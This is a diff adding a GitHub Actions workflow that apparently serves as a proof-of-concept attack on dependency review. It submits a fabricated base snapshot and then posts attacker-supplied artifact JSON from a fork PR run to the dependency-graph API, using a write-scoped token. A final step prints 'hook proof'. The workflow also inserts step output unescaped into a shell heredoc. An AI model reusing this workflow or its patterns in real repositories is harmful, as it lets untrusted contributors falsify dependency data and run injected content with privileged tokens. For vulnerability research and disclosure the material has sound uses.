@@ -1,0 +1,129 @@
+name: Dependency Review
+
+on:
+  workflow_run:
+    workflows: ["PR Workflow"]
+    types:
+      - completed
+
+permissions:
+  actions: read # to download dependency graph artifact
+  contents: write # to submit dependency graph
+  pull-requests: read # to resolve PR info for fork PRs
+
+jobs:
+  dependency-review:
+    if: |
+      github.event.workflow_run.event == 'pull_request' &&
+      github.event.workflow_run.conclusion == 'success'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get PR
+        id: get-pr
+        uses: actions/github-script@v7
+        with:
+          retries: 3
+          script: |
+            const wfRun = context.payload.workflow_run;
+            const pr = wfRun.pull_requests[0];
+            let number, base_sha, head_sha;
+            if (pr) {
+              number = pr.number;
+              base_sha = pr.base.sha;
+              head_sha = pr.head.sha;
+            } else {
+              const headLabel = `${wfRun.head_repository.owner.login}:${wfRun.head_branch}`;
+              const { data: prs } = await github.rest.pulls.list({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                state: 'open',
+                head: headLabel,
+              });
+              const matched = prs[0];
+              if (!matched) throw new Error(`No open PR found for head ${headLabel}`);
+              number = matched.number;
+              base_sha = matched.base.sha;
+              head_sha = wfRun.head_sha;
+            }
+            core.info(`is_fork:  ${pr ? 'false' : 'true'}`);
+            core.info(`number:   ${number}`);
+            core.info(`base_sha: ${base_sha}`);
+            core.info(`head_sha: ${head_sha}`);
+            core.setOutput('is_fork', pr ? 'false' : 'true');
+            core.setOutput('number', number);
+            core.setOutput('base_sha', base_sha);
+            core.setOutput('head_sha', head_sha)
+
+      # Mirrors gradle/actions/dependency-submission with dependency-graph: download-and-submit
+      - name: Download and submit dependency graph
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          BASE="${{ steps.get-pr.outputs.base_sha }}"
+          HEAD="${{ steps.get-pr.outputs.head_sha }}"
+          PRNUM="${{ steps.get-pr.outputs.number }}"
+          REPO="${{ github.repository }}"
+          API="https://api.github.com/repos/$REPO"
+
+          # 1. benign base snapshot, as the repo's CI on main would have produced
+          cat > /tmp/base.json <<JSON
+          {"version":0,"job":{"correlator":"poc-base","id":"poc-base"},"sha":"$BASE","ref":"refs/heads/main","detector":{"name":"poc","version":"1.0.0","url":"https://example.com"},"manifests":{"build.gradle.kts":{"name":"build.gradle.kts","file":{"source_location":"build.gradle.kts"},"resolved":{"pkg:maven/org.apache.commons/commons-lang3@3.12.0":{"relationship":"direct","dependencies":[]}}}}}
+          JSON
+          echo "--- base snapshot submission:"
+          curl -sS -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API/dependency-graph/snapshots" -d @/tmp/base.json
+          echo
+
+          # 2. download the attacker-supplied artifact from the triggering run
+          curl -sS -H "Authorization: Bearer $GH_TOKEN" "$API/actions/runs/${{ github.event.workflow_run.id }}/artifacts" -o /tmp/arts.json
+          python3 - <<'PY'
+          import json
+          d = json.load(open('/tmp/arts.json'))
+          names = [a['name'] for a in d.get('artifacts', [])]
+          print('artifacts:', names)
+          for a in d.get('artifacts', []):
+              if a['name'].startswith('dependency-graph_'):
+                  open('/tmp/url', 'w').write(a['archive_download_url'])
+          PY
+          curl -sSL -H "Authorization: Bearer $GH_TOKEN" "$(cat /tmp/url)" -o /tmp/art.zip
+          mkdir -p dependency-graph-reports
+          unzip -o -q /tmp/art.zip -d dependency-graph-reports
+          echo "--- extracted:"; find dependency-graph-reports -type f | head
+
+          # 3. submit every snapshot found verbatim (this is what the action does)
+          for f in $(find dependency-graph-reports -name '*.json'); do
+            echo "--- submitting $f"
+            python3 -c "import json,sys; d=json.load(open(sys.argv[1])); d['sha']=sys.argv[2]; d['ref']='refs/pull/'+sys.argv[3]+'/head'; json.dump(d,open('/tmp/sub.json','w'))" "$f" "$HEAD" "$PRNUM"
+            curl -sS -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API/dependency-graph/snapshots" -d @/tmp/sub.json
+            echo
+          done
+
+      - id: dependency-review
+        uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0
+        with:
+          base-ref: ${{ steps.get-pr.outputs.base_sha }}
+          head-ref: ${{ steps.get-pr.outputs.head_sha }}
+          warn-only: true # we don't want to fail the workflow, just to report the issues via comment
+          show-patched-versions: true
+
+      - if: ${{ steps.dependency-review.outputs.comment-content != null }}
+        name: Save dependency review output report
+        run: |
+          cat << 'EOF' > openssf-report.html
+          ${{ steps.dependency-review.outputs.comment-content }}
+          EOF
+
+      - if: ${{ steps.dependency-review.outputs.comment-content != null }}
+        uses: marocchino/sticky-pull-request-comment@v3
+        with:
+          number: ${{ steps.get-pr.outputs.number }}
+          header: dependency-review
+          hide_and_recreate: true
+          path: openssf-report.html
+          GITHUB_TOKEN: ${{ secrets.ACTIONS_BOT_TOKEN }}
+
+      - if: always()
+        name: show proof
+        run: |
+          echo "--- hook-proof.txt:"
+          cat hook-proof.txt || echo "(no hook proof)"
